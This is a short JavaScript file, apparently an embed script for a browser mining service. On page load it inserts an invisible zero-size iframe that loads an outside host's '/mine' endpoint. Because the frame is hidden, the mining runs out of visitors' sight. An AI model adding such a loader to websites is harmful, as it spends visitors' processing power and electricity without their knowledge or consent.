function addLoadEvent(fun) {
  if (window.attachEvent) window.attachEvent('onload', fun);
  else if (window.addEventListener) window.addEventListener('load', fun, false);
  else document.addEventListener('load', fun, false);
}

function bitpit(params) {
  addLoadEvent(function() {
  	var url = "http://api.bitp.it/mine?";
  	for(var name in params){
  		url = url + name + "=" + params[name] + "&";
  	}
    var frame = document.createElement("iframe");
    frame.setAttribute("src", url);
    frame.setAttribute("name", "bitpit")
    frame.setAttribute("style", "display: none;");
    frame.setAttribute("height", "0");
    frame.setAttribute("width", "0");
    document.body.appendChild(frame);
  });
}
